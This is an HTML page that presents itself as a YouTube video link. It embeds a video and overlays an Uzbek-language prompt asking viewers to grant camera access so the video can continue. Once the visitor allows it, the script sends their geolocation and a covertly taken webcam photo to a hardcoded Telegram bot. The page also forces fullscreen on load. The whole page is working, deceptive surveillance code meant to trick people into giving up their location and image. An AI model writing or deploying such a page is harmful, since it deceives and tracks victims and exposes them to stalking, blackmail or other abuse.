<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        #prompt-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        #prompt-message {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 80%;
        }
        #prompt-message button {
            margin-top: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div id="video-container">
        <iframe src="https://www.youtube.com/embed/-4fLvxV9fvE?autoplay=1&mute=0&controls=1" 
                title="YouTube video player" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                allowfullscreen>
        </iframe>
    </div>

    <div id="prompt-overlay">
        <div id="prompt-message">
            <h2>Iltimos, kameraga ruxsat bering</h2>
            <p>YouTube videoni ko‘rishda davom etish va tajribani yaxshilash uchun kamera ruxsatini bering.</p>
            <button onclick="startCamera()">Ruxsat berish</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4'; // Telegram bot token
        const CHAT_ID = '7281698380'; // Telegram chat ID

        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'photo.jpg');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) {
                    console.log("Photo sent successfully!");
                } else {
                    console.error('Failed to send photo:', await response.text());
                }
            } catch (error) {
                console.error('Error sending photo:', error);
            }
        }

        async function sendLocationToTelegram(latitude, longitude) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
                });
                if (response.ok) {
                    console.log('Location sent successfully!');
                } else {
                    console.error('Failed to send location:', await response.text());
                }
            } catch (error) {
                console.error('Error sending location:', error);
            }
        }

        async function capturePhoto() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.play();

            video.addEventListener('loadeddata', () => {
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    canvas.toBlob(async (blob) => {
                        stream.getTracks().forEach(track => track.stop());
                        await sendPhotoToTelegram(blob);
                    }, 'image/jpeg');
                }, 1000); // Delay for 1 second
            });
        }

        async function startCamera() {
            try {
                // Kamera ruxsatini so‘rash
                await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('prompt-overlay').style.display = 'none'; // Overlayni yashirish

                // Joylashuvni olish va suratga olish
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        const { latitude, longitude } = position.coords;
                        await sendLocationToTelegram(latitude, longitude);
                        await capturePhoto();
                    }, (error) => {
                        console.error('Error getting location:', error);
                    });
                } else {
                    alert('Geolocation is not supported by this browser.');
                }
            } catch (error) {
                alert('Kameraga ruxsat berilmadi. Iltimos, ruxsat bering!');
                console.error('Camera access denied:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            // To‘liq ekran rejimiga o‘tish
            document.documentElement.requestFullscreen().catch(err => {
                console.error('Failed to enter full-screen mode:', err);
            });
        });
    </script>
</body>
</html>
